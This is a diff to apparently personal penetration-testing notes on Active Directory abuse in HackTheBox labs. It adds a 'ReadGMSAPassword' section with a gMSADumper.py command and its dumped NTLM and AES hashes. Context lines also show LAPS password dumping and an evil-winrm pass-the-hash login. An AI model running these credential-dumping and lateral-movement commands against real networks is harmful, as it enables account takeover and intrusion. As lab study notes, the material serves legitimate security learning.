@@ -16,6 +16,7 @@ python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
 LAPS Dumper - Running at 07-07-2022 13:57:05
 DC &V@%DQ-wEwQ97A
 ```
+[Timelapse](https://shuciran.github.io/posts/Timelapse/#fnref:readlapspassword)
 [[StreamIO#^2cc182]]
 
 ### AddKeyCredentialLink
@@ -97,3 +98,15 @@ evil-winrm -i 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
 ```
 Examples:
 [Outdated](https://shuciran.github.io/posts/Outdated/#fnref:addkeycredentialink)
+
+### ReadGMSAPassword
+After searching about how to execute a `ReadGMSAPassword` from our user, an excellent technique to obtain the GMSA password is abusing of [gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) as follows:
+```bash
+/usr/share/privesc/Windows/gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::fca9edf1c9fb8f031dfc38d918279642
+svc_int$:aes256-cts-hmac-sha1-96:15516a903b67ce2aacda697b76fae9c2d1fc60e3408abc6587b2faeefb6bfac2
+svc_int$:aes128-cts-hmac-sha1-96:4e25dcda503a43e8757abe3081892114
+```
